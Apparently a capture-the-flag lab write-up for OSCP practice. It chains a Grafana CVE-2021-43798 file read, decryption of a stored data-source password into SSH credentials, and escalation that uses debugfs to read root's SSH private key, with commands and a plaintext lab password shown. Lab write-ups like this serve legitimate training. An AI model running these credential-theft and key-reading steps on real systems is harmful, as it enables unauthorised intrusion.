---
title: PG-Fanatastic
published: 2025-02-01
toc: true
draft: false
tags:
  - "LFI"
  - "SQL"
  - "SQLite3"
  - "OSCP Prep"
---

```
Scope:
192.168.140.181
```
# Recon

## Nmap

```bash
sudo nmap -sC -sV -vvvv -Pn -p- 192.168.140.181 -sT --min-rate=5000 -T5

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
3000/tcp open  http    syn-ack Grafana http
| http-robots.txt: 1 disallowed entry 
|_/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: F69DADBD5936359AF76AAB84559E849F
| http-title: Grafana
|_Requested resource was /login
|_http-trane-info: Problem with XML parsing of /evox/about
9090/tcp open  http    syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
| http-title: Prometheus Time Series Collection and Processing Server
|_Requested resource was /graph
| http-methods: 
|_  Supported Methods: GET OPTIONS
|_http-favicon: Unknown favicon MD5: 5EE43B38986A144D6B5022EA8C8F748F
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

I noticed the **Grafana** service running on port `3000` so looked up available PoC's for it:

![](attachments/25872b21a4af82269bf8cbc921763e61.png)

![](attachments/c21d82fe9046e0be9dca3dcd766bc878.png)

Let's see if it works:

![](attachments/219e2e8f45761e2ead0ac0b453780305.png)

It does!!

![](attachments/e50687364d6419dfbf7ba33950e424cf.png)


## SQLite3

![](attachments/ece60399a198d7d5aa389be7ed49ecba.png)

From these tables this one seemed most interesting:

```SQL
SELECT * FROM data_source;
[{"id":1,"org_id":1,"version":1,"type":"prometheus","name":"Prometheus","access":"server","url":"http://localhost:9090","password":"","user":"","database":"","basic_auth":0,"basic_auth_user":"sysadmin","basic_auth_password":"","is_default":0,"json_data":"{}","created":"2022-02-04 09:19:59","updated":"2022-02-04 09:19:59","with_credentials":0,"secure_json_data":"{\"basicAuthPassword\":\"anBneWFNQ2z+IDGhz3a7wxaqjimuglSXTeMvhbvsveZwVzreNJSw+hsV4w==\"}","read_only":0,"uid":"HkdQ8Ganz"}]
```

Note the `basicAuthPassword` here, let's write it down.

```
anBneWFNQ2z+IDGhz3a7wxaqjimuglSXTeMvhbvsveZwVzreNJSw+hsV4w==
```


## Proof of Concept

We can now utilize the [following PoC](https://github.com/jas502n/Grafana-CVE-2021-43798/blob/main/AESDecrypt.go):

![](attachments/7a66e62ec6d16643d65fb0f4f6d6a2a3.png)

We just need to change this part with our own password.

![](attachments/8dc81f33ae21cb4480cbca469f63124c.png)

![](attachments/d925ae990c365b376de8ff7748a21beb.png)


### Troubleshooting

Once we try to run it we get this error that we need to solve:

![](attachments/7b6499dd0dad4363c54c2e445b86bd7c.png)

To get this properly working we need to use the following commands:

```bash
# Enable Go modules
export GO111MODULE=on

# Initiliaze Go module in project directory
go mod init Fanatastic

# Verify dependencies
go mod tidy

# Get required package
go get golang.org/x/crypto/pbkdf2
```

And afterwards we can run our PoC:

![](attachments/1399dab165a0133734b5ac405cda7ff8.png)

```bash
sysadmin
SuperSecureP@ssw0rd
```

We can now log into SSH.


# Foothold

![](attachments/8a213a35dea467d88ebb7587ee6ef5b2.png)

I then upgrade the shell using `script -c bash /dev/null`. 


## local.txt

![](attachments/4d3e39fb734bf54673597015479246a5.png)


# Privilege Escalation

![](attachments/6c326094b02be6a0fc2bfc3118476c25.png)

We can't run `sudo -l`, let's check binaries.

![](attachments/80fd5e922881caa4f2008f583ac8fcb7.png)

Upon downloading over and running linpeas I found this:

![](attachments/0d4c9ba834d62d606309816b167d0e04.png)

I looked it up on Google:

![](attachments/7c81b4c74eb10254502f83250330b3d6.png)

Following the article we check what partition the `/` directory is mounted on.

![](attachments/3113a04bd58613c82937f3756069a181.png)

Then using `debugfs /dev/sda2` we go ahead and read the contents of `root`'s `/.ssh/id_rsa` file.

```bash
debugfs /dev/sda2
mkdir test
cat /root/.ssh/id_rsa
```

![](attachments/0f1e042f00685c38f4c8e323e674b35b.png)

Now we copy the contents on our Kali, use `chmod 600` and log into `ssh` as *root*.

![](attachments/a09b34101219e9cf71c545e39ce8d127.png)

![](attachments/d020269c52274c9fb0367d2180f57a64.png)

Awesome, let's get the flag.


## proof.txt

![](attachments/dd693cc5fc636f4b0a05ffdb64fd8290.png)

---

**Finished 11:25 01-02-2025**

[^Links]:  [[OSCP Prep]]




